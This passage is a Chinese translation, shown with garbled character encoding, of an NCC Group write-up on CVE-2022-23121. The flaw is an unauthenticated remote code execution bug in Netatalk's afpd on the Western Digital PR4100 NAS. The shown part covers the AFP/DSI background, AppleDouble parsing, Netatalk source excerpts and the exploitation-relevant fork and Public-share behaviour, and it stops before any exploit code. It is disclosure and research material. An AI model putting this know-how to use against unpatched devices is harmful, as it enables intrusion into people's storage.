---
title: ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰
date: 2022-05-01 11:11:00 +0800
categories: pwn
tags: æ¼æ´åˆ†æ
---

> æœ¬æ–‡ç¿»è¯‘è‡ªNCC Groupçš„[åšå®¢](https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/)ï¼Œä»‹ç»äº†è¯¥å›¢é˜Ÿåœ¨Pwn2Ownæ¯”èµ›æ—¶é’ˆå¯¹è¥¿éƒ¨æ•°æ®PR4100 NASçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„ç»†èŠ‚ã€‚

# æ¦‚è¿°
è¿™ç¯‡åšå®¢æ–‡ç« ä»‹ç»äº†2021å¹´9æœˆç”±NCC Groupçš„Exploit Development Groupï¼ˆEDGï¼‰å°ç»„ä¸­çš„[Alex Plaskett](https://twitter.com/alexjplaskett)ï¼Œ[Cedric Halbronn](https://twitter.com/saidelike)ä»¥åŠ[Aaron Adams](https://twitter.com/fidgetingbits)ä¸‰äººå‘ç°å¹¶åˆ©ç”¨çš„ä¸€ä¸ªè¿”å›å€¼æœªæ£€æµ‹æ¼æ´ã€‚æˆ‘ä»¬åœ¨2021å¹´9æœˆçš„Pwn2Own 2021çš„æ¯”èµ›ä¸­æˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´ï¼Œæ”»å‡»ç›®æ ‡æ˜¯è¥¿éƒ¨æ•°æ®PR4100 NASè®¾å¤‡ã€‚è¥¿éƒ¨æ•°æ®å‘å¸ƒäº†å‘å¸ƒäº†ä¸€ä¸ª[å›ºä»¶æ›´æ–°](https://os5releasenotes.mycloud.com/#/)ï¼ˆ5.19.117ï¼‰ï¼Œå®Œå…¨ç§»é™¤äº†å¯¹å­˜åœ¨æ¼æ´çš„ç¬¬ä¸‰æ–¹â€œæ²¡ä»€ä¹ˆä»·å€¼çš„NetatalkæœåŠ¡â€çš„æ”¯æŒã€‚ç”±äºè¯¥æ¼æ´åœ¨[Netatalkä»£ç ](https://github.com/Netatalk/Netatalk/commit/0c0465e4e85a27105b61b3918df8f8df0565367c)ä¸­å¾—åˆ°äº†ç¡®è®¤ï¼Œå› æ­¤è¢«åˆ†é…äº†CVE-2022-23121ç¼–å·ï¼ŒåŒæ—¶ZDIå‘å¸ƒäº†å…³äºè¯¥æ¼æ´çš„ä¸€ä»½[æŠ¥å‘Š](https://www.zerodayinitiative.com/advisories/ZDI-22-527/)å¹¶æåˆ°Netatalkå‘å¸ƒäº†æœ€æ–°çš„[3.1.13](https://netatalk.sourceforge.io/3.1/ReleaseNotes3.1.13.html)ç‰ˆæœ¬ï¼Œä¿®å¤äº†åŒ…æ‹¬è¯¥æ¼æ´åœ¨å†…çš„å¤šä¸ªæ¼æ´ã€‚

# ä»‹ç»
è¯¥æ¼æ´å±äº[Netatalk](https://en.wikipedia.org/wiki/Netatalk)é¡¹ç›®ï¼Œè¯¥é¡¹ç›®æ˜¯[è‹¹æœå½’æ¡£åè®®ï¼ˆApple Filing Protocolï¼ŒAFPï¼‰](https://en.wikipedia.org/wiki/Apple_Filing_Protocol)çš„å¼€æºå®ç°ã€‚Netatalkä»£ç å®ç°äº`/usr/sbin/afpd`æœåŠ¡ä»¥åŠ`/lib64/libatalk.so`åŠ¨æ€åº“ã€‚åœ¨[è¥¿éƒ¨æ•°æ®My Cloud Pro PR4100](https://shop.westerndigital.com/products/network-attached-storage/wd-my-cloud-pro-series-pr4100#WDBNFA0000NBK-NESN) NASè®¾å¤‡ä¸­ï¼Œ`afpd`æœåŠ¡åœ¨é»˜è®¤çŠ¶æ€ä¸‹æ˜¯æ‰“å¼€çš„ã€‚

è¯¥æ¼æ´å¯ä»¥åœ¨æ— éœ€ç»è¿‡è®¤è¯çš„å‰æä¸‹è¢«è¿œç¨‹åˆ©ç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªæ”»å‡»è€…ä»¥`nobody`ç”¨æˆ·çš„èº«ä»½åœ¨NASä¸Šè¿œç¨‹æ‰§è¡Œä»£ç ã€‚è¯¥ç”¨æˆ·å¯ä»¥è®¿é—®é€šå¸¸æƒ…å†µä¸‹éœ€è¦ç»è¿‡èº«ä»½è®¤è¯æ‰èƒ½è®¿é—®çš„ç§æœ‰å…±äº«ã€‚

æˆ‘ä»¬å·²ç»åœ¨5.17.107ç‰ˆæœ¬ä¸Šåˆ†æå¹¶åˆ©ç”¨äº†è¯¥æ¼æ´ï¼Œè¿™å°†åœ¨ä¸‹æ–‡ä¸­è¯¦ç»†è¯´æ˜ï¼Œè¯¥æ¼æ´ä¹Ÿå¯èƒ½å­˜åœ¨äºæ—§ç‰ˆæœ¬çš„å›ºä»¶ä¸­ã€‚

æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®My Cloud Pro Series PR4100 NASè®¾å¤‡æ˜¯åŸºäºx86_64æ¶æ„çš„ã€‚

æˆ‘ä»¬å°†æˆ‘ä»¬çš„åˆ©ç”¨å‘½åä¸ºâ€œæœˆé¥¼â€ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨2021å¹´9æœˆ21æ—¥å®Œæˆäº†åˆ©ç”¨ä»£ç çš„ç¼–å†™ï¼Œè¿™ä¸€å¤©æ˜¯2021å¹´çš„[ä¸­ç§‹èŠ‚](https://en.wikipedia.org/wiki/Mid-Autumn_Festival)ã€‚

> è¯‘è€…ï¼šè¯¥æ¼æ´çš„ç ”ç©¶äººå‘˜ä¼¼ä¹äº†è§£æˆ–å–œæ¬¢ä¸­å›½æ–‡åŒ–ï¼Œæ¯”å¦‚å…¶ä¸­ä¹‹ä¸€çš„Cedric Halbronnçš„Twitter IDæ˜¯â€œsaidelikeâ€ï¼Œå³Cedricåœ¨ä¸­æ–‡ç¿»è¯‘ä¸‹çš„æ‹¼éŸ³ã€‚ä¹Ÿå¯èƒ½ä»–æœ‰ä¸€ä½å…³ç³»å¾ˆå¥½çš„ä¸­å›½æœ‹å‹/äº²äººã€‚å»å¹´ä¸­ç§‹ï¼Œæˆ‘åœ¨è¿‡èŠ‚æ‘¸é±¼ï¼Œè€Œå¤§ä½¬åœ¨æŒ–æ´ğŸ™ƒã€‚

# æ¼æ´ç»†èŠ‚
## A. èƒŒæ™¯
### DSI/AFP åè®®
è‹¹æœå½’æ¡£åè®®ï¼ˆAFPï¼‰æ˜¯çŸ¥åçš„[Server Message Blockï¼ˆSMBï¼‰](https://en.wikipedia.org/wiki/Server_Message_Block)åè®®çš„æ›¿ä»£ï¼Œç”¨æ¥åœ¨ç½‘ç»œä¸­å…±äº«æ–‡ä»¶ã€‚AFPåè®®çš„æ ‡å‡†å¯ä»¥åœ¨[è¿™é‡Œ](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.363.9481&rep=rep1&type=pdf)æ‰¾åˆ°ã€‚

AFPé€šè¿‡[Data Stream Interfaceï¼ˆDSIï¼‰](https://en.wikipedia.org/wiki/Data_Stream_Interface)åè®®ä¼ è¾“ï¼Œè¯¥åè®®åŸºäºTCP/IPï¼Œå¼€æ”¾åœ¨TCPçš„548ç«¯å£ã€‚

ç„¶è€Œï¼ŒSMBåè®®åœ¨æ–‡ä»¶å…±äº«ç½‘ç»œåè®®ä¸­æ›´èƒœä¸€ç­¹ï¼ŒAFPåè®®åˆ™é²œä¸ºäººçŸ¥ï¼Œå³ä½¿å®ƒä»ç„¶åœ¨NASç­‰ç½‘ç»œè®¾å¤‡ä¸Šè¢«æ”¯æŒã€‚AFPåè®®åœ¨è‹¹æœOS X 10.9ç‰ˆæœ¬ç³»ç»Ÿä¸­è¢«å¼ƒç”¨ï¼ŒAFPæœåŠ¡å™¨åˆ™åœ¨OS X 11ç‰ˆæœ¬ä¸­è¢«ç§»é™¤ã€‚

### Netatalk
Netatalké¡¹ç›®æ˜¯UNIXå¹³å°ä¸‹AFP/DSIåè®®çš„å®ç°ï¼Œå…¶ä»£ç åœ¨2000å¹´è¢«è½¬ç§»è‡³SourceForgeã€‚è¯¥é¡¹ç›®æœ€æ—©çš„ç›®æ ‡æ˜¯å…è®¸ç±»UNIXæ“ä½œç³»ç»Ÿä½œä¸ºAFPæœåŠ¡å™¨ï¼Œä¸ºè®¸å¤šMacintoshæˆ–OS Xå®¢æˆ·ç«¯æœåŠ¡ã€‚

å¦‚ä¹‹å‰æ‰€è¿°ï¼ŒAFPåè®®è¶Šæ¥è¶Šä¸å—å…³æ³¨ã€‚è¿™ä¹Ÿå½±å“åˆ°äº†Netatalké¡¹ç›®ã€‚æœ€è¿‘çš„Netatalkç¨³å®šç‰ˆæœ¬æ˜¯[3.1.12](http://netatalk.sourceforge.net/)ï¼Œäº2018å¹´å°±å·²ç»è¢«å…¬å¼€ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªé¡¹ç›®å‡ ä¹æ˜¯ä¸€ä¸ªè¢«é—å¼ƒä¸”ä¸è¢«æ”¯æŒçš„é¡¹ç›®ã€‚

> è¯‘è€…ï¼šNetatalkå½“å‰å·²æ›´æ–°è‡³`3.1.13`ç‰ˆæœ¬ã€‚

Netatalké¡¹ç›®æ›¾å—ç¼–å·ä¸ºCVE-2018-1160æ¼æ´çš„å½±å“ï¼Œè¯¥æ¼æ´åœ¨ä½äºï¼ˆä¸åŒ…æ‹¬ï¼‰`3.1.12`ç‰ˆæœ¬çš„Netatalkä¸­å­˜åœ¨ï¼Œäº§ç”Ÿçš„åŸå› æ˜¯DSIOpensessionå‘½ä»¤ï¼ˆ`dsi_opensession()`ï¼‰ä¸­å­˜åœ¨è¶Šç•Œå†™ã€‚è¿™ä¸ªæ¼æ´æ›¾ç»è¢«ç”¨åœ¨[å¸Œæ·NAS](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)è®¾å¤‡ä¸­ï¼Œå› ä¸ºè¯¥è®¾å¤‡æ²¡æœ‰å¼€å¯ASLRï¼Œä¹‹ååœ¨[Hitcon 2019 CTF](https://translate.google.com/translate?sl=auto&tl=en&u=https://ama2in9.top/2021/01/07/cve-2018-1160/)ä¸­å¼€å¯ASLRçš„ç¯å¢ƒä¸­å†æ¬¡è¢«åˆ©ç”¨ã€‚

> è¯‘è€…ï¼šå…³äº`CVE-2018-1160`æ¼æ´çš„åˆ†æï¼Œå¯è§æˆ‘çš„[ä¸Šä¸€ç¯‡](https://gtrboy.github.io/posts/netatalk/)åšå®¢ã€‚

### AppleDoubleæ–‡ä»¶æ ¼å¼
[AppleSingleå’ŒAppleDouble](https://en.wikipedia.org/wiki/AppleSingle_and_AppleDouble_formats)æ–‡ä»¶æ ¼å¼çš„ç”¨é€”æ˜¯å­˜å‚¨æ“ä½œç³»ç»Ÿä¸­å¸¸è§„æ–‡ä»¶çš„å…ƒæ•°æ®å¹¶å…è®¸åœ¨ä¸åŒæ–‡ä»¶ç³»ç»Ÿä¸­å…±äº«è¿™äº›ä¿¡æ¯ï¼Œè€Œæ— éœ€æ‹…å¿ƒè¿™äº›ç³»ç»Ÿé—´çš„äº’æ“ä½œæ€§ã€‚

è¿™ä¸¤ä¸ªæ–‡ä»¶æ ¼å¼çš„ä¸»è¦æ€æƒ³æ˜¯åŸºäºä»¥ä¸‹äº‹å®ï¼šä»»ä½•æ–‡ä»¶ç³»ç»Ÿéƒ½å…è®¸å°†æ–‡ä»¶å­˜å‚¨ä¸ºä¸€ç³»åˆ—å­—èŠ‚ã€‚å› æ­¤ï¼Œå¯ä»¥å°†å¸¸è§„æ–‡ä»¶çš„å…ƒæ•°æ®ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶çš„å±æ€§ä¿¡æ¯ï¼‰ä¿å­˜åœ¨é™„åŠ æ–‡ä»¶å½“ä¸­ï¼Œå¹¶å°†è¿™äº›å±æ€§åæ˜ å›å¦ä¸€ç«¯ï¼ˆæˆ–è€…è‡³å°‘éƒ¨åˆ†å±æ€§ï¼‰ï¼Œåªè¦å¦ä¸€ç«¯çš„æ–‡ä»¶ç³»ç»Ÿæ”¯æŒå®ƒä»¬ã€‚å¦åˆ™ï¼Œè¿™äº›é™„åŠ çš„å±æ€§ä¹Ÿå¯ä»¥è¢«ä¸¢å¼ƒã€‚

AppleSingleå’ŒAppleDoubleæ ‡å‡†å¯ä»¥åœ¨[è¿™é‡Œ](https://web.archive.org/web/20180311140826/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf)æ‰¾åˆ°ã€‚AppleDoubleæ–‡ä»¶æ ¼å¼åœ¨[sambaçš„æºä»£ç ](https://github.com/samba-team/samba/blob/master/source3/lib/adouble.c)ä¸­ä¹Ÿæœ‰æ³¨é‡Šï¼š

```
/*
   "._" AppleDouble Header File Layout:
         MAGIC          0x00051607
         VERSION        0x00020000
         FILLER         0
         COUNT          2
     .-- AD ENTRY[0]    Finder Info Entry (must be first)
  .--+-- AD ENTRY[1]    Resource Fork Entry (must be last)
  |  |   /////////////
  |  '-> FINDER INFO    Fixed Size Data (32 Bytes)
  |      ~~~~~~~~~~~~~  2 Bytes Padding
  |      EXT ATTR HDR   Fixed Size Data (36 Bytes)
  |      /////////////
  |      ATTR ENTRY[0] --.
  |      ATTR ENTRY[1] --+--.
  |      ATTR ENTRY[2] --+--+--.
  |         ...          |  |  |
  |      ATTR ENTRY[N] --+--+--+--.
  |      ATTR DATA 0   <-'  |  |  |
  |      ////////////       |  |  |
  |      ATTR DATA 1   <----'  |  |
  |      /////////////         |  |
  |      ATTR DATA 2   <-------'  |
  |      /////////////            |
  |         ...                   |
  |      ATTR DATA N   <----------'
  |      /////////////
  |         ...          Attribute Free Space
  |
  '----> RESOURCE FORK
            ...          Variable Sized Data
            ...
*/
```

`afpd`äºŒè¿›åˆ¶æ–‡ä»¶å’Œ`libatalk.so`åº“æ–‡ä»¶å¹¶ä¸åŒ…å«ç¬¦å·ã€‚ç„¶è€Œï¼Œç”±äº[GNUå…¬å…±è®¸å¯è¯ï¼ˆGPLï¼‰](https://en.wikipedia.org/wiki/GNU_General_Public_License)çš„è¦æ±‚ï¼Œè¥¿éƒ¨æ•°æ®å‘å¸ƒäº†å®ƒä»¬ä½¿ç”¨çš„[Netatalkçš„å¼€æºå®ç°ä»¥åŠè¡¥ä¸](https://downloads.wdc.com/gpl/WDMyCloud_PR4100_GPL_v5.16.105_20210728.tar.gz)ã€‚è¥¿éƒ¨æ•°æ®å‘å¸ƒçš„æœ€æ–°çš„æºä»£ç æ¡£æ¡ˆç‰ˆæœ¬ä¸º`5.16.105`ï¼Œä¸æˆ‘ä»¬æ‰€åˆ†æçš„æœ€æ–°ç‰ˆæœ¬å›ºä»¶ï¼ˆ5.17.107ï¼‰å¹¶ä¸åŒ¹é…ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ç¡®è®¤äº†`afpd`å’Œ`libatalk.so`åœ¨åˆ°ç›®å‰ä¸ºæ­¢çš„5ä¸ªæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚å› æ­¤ï¼Œæœ¬æ–‡ä¹‹åæ‰€ç¤ºçš„ä»£ç é€šå¸¸æ¥è‡ªäºNetatalkçš„æºä»£ç ã€‚

æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®PR4100ä»¥æœ€æ–°çš„`3.1.12`ç‰ˆæœ¬çš„netatalkæºä»£ç ä¸ºåŸºç¡€ã€‚

è®©æˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼ŒNetatalkåœ¨æ‰“å¼€å­˜å‚¨ä¸ºAppleDoubleæ ¼å¼çš„forkæ–‡ä»¶æ—¶ï¼Œæ˜¯å¦‚ä½•æ¥å—å®¢æˆ·ç«¯è¿æ¥ã€è§£æAFPè¯·æ±‚ï¼Œä»è€Œè§¦å‘æ¼æ´ä»£ç éƒ¨çš„ã€‚

`main()`å‡½æ•°å…¥å£ç‚¹åˆå§‹åŒ–äº†å¾ˆå¤šå†…å­˜å¯¹è±¡ï¼ŒåŠ è½½AFPé…ç½®ä¿¡æ¯ï¼Œå¹¶å¼€å§‹ç›‘å¬AFPç«¯å£ï¼ˆTCP 548ï¼‰ã€‚

```c++
//netatalk-3.1.12/etc/afpd/main.c
int main(int ac, char **av)
{
    ...
    /* wait for an appleshare connection. parent remains in the loop
     * while the children get handled by afp_over_{asp,dsi}.  this is
     * currently vulnerable to a denial-of-service attack if a
     * connection is made without an actual login attempt being made
     * afterwards. establishing timeouts for logins is a possible
     * solution. */
    while (1) {
        ...
        for (int i = 0; i < asev->used; i++) {
            if (asev->fdset[i].revents & (POLLIN | POLLERR | POLLHUP | POLLNVAL)) {
                switch (asev->data[i].fdtype) {

                case LISTEN_FD:
                    if ((child = dsi_start(&obj, (DSI *)(asev->data[i].private), server_children))) {
                        ...
                    }
                    break;
    ...
```

`dsi_start()`å‡½æ•°åŸºæœ¬ä¸Šåªè°ƒç”¨äº†2ä¸ªå‡½æ•°ï¼š`dsi_getsession()`ä»¥åŠ`afp_over_dsi()`ã€‚

```c++
//netatalk-3.1.12/etc/afpd/main.c
static afp_child_t *dsi_start(AFPObj *obj, DSI *dsi, server_child_t *server_children)
{
    afp_child_t *child = NULL;

    if (dsi_getsession(dsi, server_children, obj->options.tickleval, &child) != 0) {
        LOG(log_error, logtype_afpd, "dsi_start: session error: %s", strerror(errno));
        return NULL;
    }

    /* we've forked. */
    if (child == NULL) {
        configfree(obj, dsi);
        afp_over_dsi(obj); /* start a session */
        exit (0);
    }

    return child;
}
```

å…¶ä¸­`dsi_getsession()`å‡½æ•°è°ƒç”¨äº†`dsi->proto_open`è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘`dsi_tcp_open()`å‡½æ•°ã€‚

```c++
//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c
/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */
int dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp)
{
  ...
  switch (pid = dsi->proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */
```

`dsi_tcp_open()`å‡½æ•°æ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œé€šè¿‡`fork()`å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶åˆå§‹åŒ–ä¸å®¢æˆ·ç«¯çš„DSIä¼šè¯ã€‚

æç¤ºï¼šè¿™å¯¹ä¹‹åçš„åˆ©ç”¨éå¸¸æœ‰ç”¨ã€‚

> è¯‘è€…ï¼šCVE-2018-1160 åŒæ ·éœ€è¦åˆ©ç”¨Netatalkçš„è¿™ä¸€ç‰¹æ€§ï¼Œå³å¯¹æ¯ä¸ªå®¢æˆ·ç«¯å‘æ¥çš„è¿æ¥ï¼Œéƒ½æ˜¯ç”¨`fork()`å‡½æ•°æ–°å»ºä¸€ä¸ªå­è¿›ç¨‹å•ç‹¬å¤„ç†ä¼šè¯ã€‚è¿™æ˜¯ç”±äºé€šè¿‡`fork()`åˆ›å»ºçš„æ¯ä¸ªå­è¿›ç¨‹çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€æ˜¯ç›¸åŒçš„ï¼Œå¯ä»¥é€šè¿‡è¯¥ç‰¹æ€§ï¼Œåˆ©ç”¨ä¿¡æ¯æ³„éœ²æ¼æ´è·å–åœ°å€ã€‚

```c++
/* accept the socket and do a little sanity checking */
static pid_t dsi_tcp_open(DSI *dsi)
{
    pid_t pid;
    SOCKLEN_T len;

    len = sizeof(dsi->client);
    dsi->socket = accept(dsi->serversock, (struct sockaddr *) &dsi->client, &len);
    ...
   if (0 == (pid = fork()) ) { /* child */
        ...
    }

    /* send back our pid */
    return pid;
}
```

å›åˆ°`dsi_getsession()`å‡½æ•°ï¼Œçˆ¶è¿›ç¨‹`afpd`è®¾ç½® `*childp!=NULL`ï¼Œè€Œforkå‡ºçš„å¤„ç†å®¢æˆ·ç«¯è¿æ¥çš„å­è¿›ç¨‹è®¾ç½® `*childp==NULL`ã€‚

```c++
//netatalk-3.1.12/libatalk/dsi/dsi_getsess.c
/*!
 * Start a DSI session, fork an afpd process
 *
 * @param childp    (w) after fork: parent return pointer to child, child returns NULL
 * @returns             0 on sucess, any other value denotes failure
 */
int dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp)
{
  ...
  switch (pid = dsi->proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */
  case -1:
    /* if we fail, just return. it might work later */
    LOG(log_error, logtype_dsi, "dsi_getsess: %s", strerror(errno));
    return -1;

  case 0: /* child. mostly handled below. */
    break;

  default: /* parent */
    /* using SIGKILL is hokey, but the child might not have
     * re-established its signal handler for SIGTERM yet. */
    close(ipc_fds[1]);
    if ((child = server_child_add(serv_children, pid, ipc_fds[0])) ==  NULL) {
      LOG(log_error, logtype_dsi, "dsi_getsess: %s", strerror(errno));
      close(ipc_fds[0]);
      dsi->header.dsi_flags = DSIFL_REPLY;
      dsi->header.dsi_data.dsi_code = htonl(DSIERR_SERVBUSY);
      dsi_send(dsi);
      dsi->header.dsi_data.dsi_code = DSIERR_OK;
      kill(pid, SIGKILL);
    }
    dsi->proto_close(dsi);
    *childp = child;
    return 0;
  }
  ...
  switch (dsi->header.dsi_command) {
  ...
  case DSIFUNC_OPEN: /* setup session */
    /* set up the tickle timer */
    dsi->timer.it_interval.tv_sec = dsi->timer.it_value.tv_sec = tickleval;
    dsi->timer.it_interval.tv_usec = dsi->timer.it_value.tv_usec = 0;
    dsi_opensession(dsi);
    *childp = NULL;
    return 0;

  default: /* just close */
    LOG(log_info, logtype_dsi, "DSIUnknown %d", dsi->header.dsi_command);
    dsi->proto_close(dsi);
    exit(EXITERR_CLNT);
  }
}
```

è®©æˆ‘ä»¬å›åˆ°`dsi_start()`å‡½æ•°ã€‚å¯¹äºçˆ¶è¿›ç¨‹æ¥è¯´ï¼Œæ²¡æœ‰å‘ç”Ÿä»»ä½•æ–°çš„äº‹æƒ…ï¼Œå¹¶ä¸”`main()`å‡½æ•°ç»§ç»­å¹¶æ°¸è¿œå¾ªç¯ä¸‹å»ï¼Œç­‰å¾…å…¶å®ƒå®¢æˆ·ç«¯çš„è¿æ¥ã€‚å¯¹äºå¤„ç†å®¢æˆ·ç«¯è¿æ¥çš„å­è¿›ç¨‹æ¥è¯´ï¼Œ`afp_over_dsi()`å‡½æ•°è¢«è°ƒç”¨ã€‚è¯¥å‡½æ•°è¯»å–AFPæ•°æ®åŒ…ï¼ˆDSI payloadï¼‰ï¼Œåˆ¤æ–­AFPå‘½ä»¤æ˜¯ä»€ä¹ˆï¼Œå¹¶æ ¹æ®å‘½ä»¤è°ƒç”¨`afp_switch[]`å…¨å±€æ•°ç»„ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ¥å¤„ç†AFPå‘½ä»¤ã€‚

```c++
//netatalk-3.1.12/etc/afpd/afp_dsi.c
/* -------------------------------------------
 afp over dsi. this never returns.
*/
void afp_over_dsi(AFPObj *obj)
{
    ...
    /* get stuck here until the end */
    while (1) {
        ...
        /* Blocking read on the network socket */
        cmd = dsi_stream_receive(dsi);
        ...
        switch(cmd) {
        ...
        case DSIFUNC_CMD:
            ...
                /* send off an afp command. in a couple cases, we take advantage
                 * of the fact that we're a stream-based protocol. */
                if (afp_switch[function]) {
                    dsi->datalen = DSI_DATASIZ;
                    dsi->flags |= DSI_RUNNING;

                    LOG(log_debug, logtype_afpd, "<== Start AFP command: %s", AfpNum2name(function));

                    AFP_AFPFUNC_START(function, (char *)AfpNum2name(function));
                    err = (*afp_switch[function])(obj,
                                                  (char *)dsi->commands, dsi->cmdlen,
                                                  (char *)&dsi->data, &dsi->datalen);
```

`afp_switch[]`å…¨å±€æ•°ç»„åœ¨ä¸€å¼€å§‹è¢«åˆå§‹åŒ–ä¸º`preauth_switch`ï¼Œè¯¥å…¨å±€å˜é‡åŒ…å«äº†ä¸€äº›åœ¨è®¤è¯å‰å¯ä»¥æ‰§è¡Œçš„å‡½æ•°å¥æŸ„ã€‚æˆ‘ä»¬å¯ä»¥çŒœå‡ºï¼Œå½“å®¢æˆ·ç«¯é€šè¿‡éªŒè¯ä¹‹åï¼Œè¯¥å…¨å±€æ•°ç»„å°†è¢«è®¾ç½®ä¸º`postauth_switch`è¿™ä¸ªå€¼ï¼Œè¯¥å€¼ä¼šç»™å®¢æˆ·ç«¯æ›´å¤šçš„å…¶å®ƒAFPç‰¹æ€§çš„è®¿é—®æƒé™ã€‚

```c++
//netatalk-3.1.12/etc/afpd/switch.c
/*
 * Routines marked "NULL" are not AFP functions.
 * Routines marked "afp_null" are AFP functions
 * which are not yet implemented. A fine line...
 */
static AFPCmd preauth_switch[] = {
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*   0 -   7 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*   8 -  15 */
    NULL, NULL, afp_login, afp_logincont,
    afp_logout, NULL, NULL, NULL,				/*  16 -  23 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*  24 -  31 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*  32 -  39 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*  40 -  47 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL,					/*  48 -  55 */
    NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, afp_login_ext,				/*  56 -  63 */
    ...
};

AFPCmd *afp_switch = preauth_switch;

AFPCmd postauth_switch[] = {
    NULL, afp_bytelock, afp_closevol, afp_closedir,
    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,	/*   0 -   7 */
    afp_delete, afp_enumerate, afp_flush, afp_flushfork,
    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,	/*   8 -  15 */
    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,
    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,	/*  16 -  23 */
    afp_openvol, afp_opendir, afp_openfork, afp_read,
    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,
    /*  24 -  31 */
    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,
    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, /*  32 -  39 */
    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,
    afp_null, afp_null, afp_null, afp_null,			/*  40 -  47 */
    afp_opendt, afp_closedt, afp_null, afp_geticon,
    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,	/*  48 -  55 */
    afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,
    ...
};
```

è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰è¶£çš„äº‹æƒ…å€¼å¾—æ³¨æ„ï¼šè¥¿éƒ¨æ•°æ®PR4100è®¾å¤‡åœ¨é»˜è®¤ç¯å¢ƒä¸‹å¼€æ”¾äº†ä¸€ä¸ª`Public`çš„AFPå…±äº«ï¼Œå…è®¸å®¢æˆ·ç«¯ä¸ç»ä»»ä½•è®¤è¯å³å¯è®¿é—®ã€‚è¿™æ„å‘³ç€åªè¦æˆ‘ä»¬è®¿é—®çš„ç›®æ ‡æ˜¯è¿™ä¸ª`Public` AFPå…±äº«ï¼Œå°±å¯ä»¥è®¿é—®æ‰€æœ‰è®¤è¯åçš„å‡½æ•°å¥æŸ„ã€‚å¦å¤–åŒæ ·å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç›¸åŒçš„`Public`å…±äº«ç›®å½•ä¹Ÿå¯ä»¥ä½¿ç”¨guestç”¨æˆ·é€šè¿‡SMBåè®®æ¥è®¿é—®ï¼Œè€Œä¸éœ€è¦è¾“å…¥ä»»ä½•å¯†ç ã€‚è¿™è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡AFPæˆ–è€…SMBåè®®è¯»å–ã€åˆ›å»ºæˆ–ä¿®æ”¹å­˜å‚¨äºè¿™ä¸ª`Public`å…±äº«ç›®å½•ä¸­ä»»æ„æ–‡ä»¶ã€‚

æˆ‘ä»¬æ„Ÿå…´è¶£çš„AFPå‘½ä»¤æ˜¯â€œFPOpenForkâ€ï¼Œè¯¥å‘½ä»¤è¢«`afp_openfork()`å‡½æ•°å¥æŸ„æ¥å¤„ç†ã€‚å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œforkæ–‡ä»¶æ˜¯ç”¨æ¥å­˜å‚¨ä¸€ä¸ªå¸¸è§„æ–‡ä»¶çš„å±æ€§ç­‰å…ƒæ•°æ®çš„ç‰¹æ®Šæ–‡ä»¶ã€‚forkæ–‡ä»¶æ˜¯ä»¥AppleDoubleæ–‡ä»¶æ ¼å¼å­˜å‚¨çš„ã€‚`afp_openfork()`å‡½æ•°å¥æŸ„ä¼šåœ¨ç£ç›˜ä¸ŠæŸ¥æ‰¾forkæ–‡ä»¶çš„è·¯å¾„å¹¶æ‰“å¼€ï¼Œä¹‹åè°ƒç”¨`ad_open()`å‡½æ•°æ¥å¤„ç†ï¼ˆâ€œadâ€ä»£è¡¨AppleDoubleï¼‰ã€‚

```c++
//netatalk-3.1.12/etc/afpd/fork.c
/* ----------------------- */
int afp_openfork(AFPObj *obj _U_, char *ibuf, size_t ibuflen _U_, char *rbuf, size_t *rbuflen)
{
    ...
    struct adouble  *adsame = NULL;
    ...
    if ((opened = of_findname(vol, s_path))) {
        adsame = opened->of_ad;
    }
    ...
